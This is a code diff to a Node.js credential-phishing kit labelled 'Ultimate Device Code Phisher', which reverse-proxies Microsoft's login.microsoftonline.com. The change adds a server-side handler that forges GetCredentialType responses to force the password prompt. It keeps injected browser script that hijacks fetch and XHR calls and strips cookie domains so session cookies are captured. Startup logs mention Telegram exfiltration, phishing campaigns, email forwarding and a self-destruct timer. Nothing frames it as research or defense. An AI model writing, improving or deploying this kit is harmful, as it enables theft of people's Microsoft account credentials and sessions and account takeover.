@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.12 – GetCredentialType Spoof
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.13 – Backend Mock
 // ============================================================
-// Frontend spoofs GetCredentialType, forcing password screen instantly.
+// Intercepts GetCredentialType at the proxy and returns a fake success.
 // ============================================================
 
 const http = require('http');
@@ -162,7 +162,6 @@ function stripCookieDomain(headers) {
     const setCookie = headers['set-cookie'];
     if (!setCookie) return;
     const newCookies = (Array.isArray(setCookie) ? setCookie : [setCookie]).map(cookie => {
-        // Remove Domain=...; part (case‑insensitive)
         return cookie.replace(/;\s*Domain=[^;]*(;|$)/gi, '');
     });
     headers['set-cookie'] = newCookies;
@@ -672,6 +671,22 @@ app.all('/login*', async (req, res) => {
         return;
     }
 
+    // 🔥 NEW: Intercept GetCredentialType and return a fake success JSON
+    if (req.path.includes('GetCredentialType')) {
+        console.log('[PHANTOM] Intercepted GetCredentialType, returning mock.');
+        const fakeResponse = {
+            "Credentials": {
+                "AuthMethod": "Password",
+                "FederationRedirectUrl": null
+            }
+        };
+        res.setHeader('Access-Control-Allow-Origin', '*');
+        res.setHeader('Access-Control-Allow-Headers', '*');
+        res.setHeader('Content-Type', 'application/json');
+        res.status(200).json(fakeResponse);
+        return;
+    }
+
     const targetBase = 'https://login.microsoftonline.com';
     let targetPath = req.url.replace(/^\/login/, '');
     
@@ -761,6 +776,7 @@ app.all('/login*', async (req, res) => {
                 const $ = cheerio.load(html);
                 
                 // 🔥 SPOOFING SCRIPT: Intercepts GetCredentialType and fakes a success
+                // (We keep it as a fallback, but the backend already handles it)
                 const captureScript = `
                     <script>
                         (function() {
@@ -859,7 +875,6 @@ app.all('/login*', async (req, res) => {
                             XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
                                 if (typeof url === 'string' && url.includes('GetCredentialType')) {
                                     console.log('[PHANTOM] ✅ XHR Spoofing GetCredentialType.');
-                                    // We don't need to do anything else; fetch override covers modern flows.
                                 }
                                 if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
                                     const newUrl = '/login' + url.replace('https://login.microsoftonline.com', '');
@@ -1115,7 +1130,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.12 – GetCredentialType Spoof running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.13 – Backend Mock running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1123,7 +1138,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Full reverse-proxy with GetCredentialType spoofing: ACTIVE`);
+    console.log(`🚀 GetCredentialType intercepted & mocked at backend: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
